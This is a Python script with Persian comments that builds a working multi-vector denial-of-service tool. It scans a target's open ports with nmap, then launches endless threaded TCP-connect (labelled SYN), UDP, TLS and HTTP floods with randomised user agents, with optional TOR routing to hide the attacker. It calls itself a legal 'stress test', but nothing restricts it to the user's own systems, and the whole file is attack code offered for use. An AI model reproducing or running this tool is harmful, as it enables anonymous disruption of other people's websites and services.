import socket
import threading
import requests
import dns.resolver
import time
import random
from cryptography.fernet import Fernet
import nmap
import socks
import ssl
import logging
from fake_useragent import UserAgent

# ---- تنظیمات پیشرفته ----
ENCRYPTION_KEY = Fernet.generate_key()  # کلید رمزنگاری
fernet = Fernet(ENCRYPTION_KEY)
MAX_THREADS = 500  # تعداد نخ‌های موازی
REQUEST_DELAY = 0.5  # تأخیر بین درخواست‌ها (ثانیه)
TOR_PROXY = False  # استفاده از TOR برای ناشناس ماندن (اختیاری)

# ---- لاگ‌گیری ----
logging.basicConfig(
    filename='stress_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ---- دریافت خودکار IP و پورت‌ها ----
def get_target_info(url):
    try:
        domain = url.split("//")[-1].split("/")[0]
        ip = socket.gethostbyname(domain)
        open_ports = scan_ports(ip)
        return ip, open_ports if open_ports else [80]  # پیش‌فرض پورت 80
    except Exception as e:
        logging.error(f"Error resolving target: {e}")
        return None, None

# ---- اسکن پورت‌های باز با NMAP ----
def scan_ports(ip):
    try:
        scanner = nmap.PortScanner()
        scanner.scan(ip, arguments='-p 1-1000 -T4')
        return [port for port in scanner[ip]['tcp'] if scanner[ip]['tcp'][port]['state'] == 'open']
    except Exception as e:
        logging.error(f"Port scan failed: {e}")
        return []

# ---- رمزنگاری پیشرفته پکت‌ها ----
def encrypt_packet(data):
    return fernet.encrypt(data.encode())

# ---- تنظیم پروکسی TOR (اختیاری) ----
def set_tor_proxy():
    if TOR_PROXY:
        socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
        socket.socket = socks.socksocket

# ---- حمله ترکیبی پیشرفته ----
def advanced_attack(target_ip, target_ports):
    # 1. TCP SYN Flood (رمزنگاری‌شده)
    def syn_flood(port):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))
                encrypted_data = encrypt_packet(f"SYN_FLOOD_{random.randint(1, 1000)}")
                s.send(encrypted_data)
                time.sleep(0.01)
            except Exception as e:
                logging.warning(f"SYN Flood error: {e}")

    # 2. HTTP Flood با هدرهای جعلی و User-Agent تصادفی
    def http_flood():
        ua = UserAgent()
        while True:
            try:
                headers = {
                    "User-Agent": ua.random,
                    "X-Attack": str(random.randint(1, 1000)),
                    "Accept-Language": "en-US,en;q=0.9"
                }
                requests.get(f"http://{target_ip}", headers=headers, timeout=2)
                time.sleep(REQUEST_DELAY)
            except Exception as e:
                logging.warning(f"HTTP Flood error: {e}")

    # 3. ارسال پکت‌های حجیم UDP
    def udp_flood(port):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                large_packet = random._urandom(2048)  # پکت 2KB تصادفی
                s.sendto(large_packet, (target_ip, port))
            except Exception as e:
                logging.warning(f"UDP Flood error: {e}")

    # 4. حمله SSL/TLS (HTTPS Flood)
    def ssl_flood(port):
        context = ssl.create_default_context()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssl_sock = context.wrap_socket(s, server_hostname=target_ip)
                ssl_sock.connect((target_ip, port))
                ssl_sock.send(encrypt_packet("HTTPS_FLOOD"))
                time.sleep(0.05)
            except Exception as e:
                logging.warning(f"SSL Flood error: {e}")

    # اجرای همزمان حملات روی تمام پورت‌ها
    attacks = [syn_flood, udp_flood, ssl_flood]
    threads = []
    
    for port in target_ports:
        for attack in attacks:
            t = threading.Thread(target=attack, args=(port,))
            t.daemon = True
            threads.append(t)
            t.start()
    
    # HTTP Flood جداگانه اجرا می‌شود (نیاز به پورت خاصی ندارد)
    for _ in range(MAX_THREADS // 2):
        t = threading.Thread(target=http_flood)
        t.daemon = True
        threads.append(t)
        t.start()

    logging.info(f"Attack started on {target_ip} (Ports: {target_ports})")
    while True:
        time.sleep(1)

# ---- اجرای اصلی (فقط برای تست داخلی) ----
if __name__ == "__main__":
    set_tor_proxy()  # فعالسازی TOR اگر نیاز باشد
    TARGET_URL = input("Enter TEST URL (e.g., http://example.com): ").strip()
    target_ip, target_ports = get_target_info(TARGET_URL)
    
    if target_ip and target_ports:
        print(f"🔰 Target IP: {target_ip}, Open Ports: {target_ports}")
        print("🚀 Starting advanced stress test (LEGAL USE ONLY!)")
        advanced_attack(target_ip, target_ports)
    else:
        print("❌ Invalid URL or unable to resolve IP.")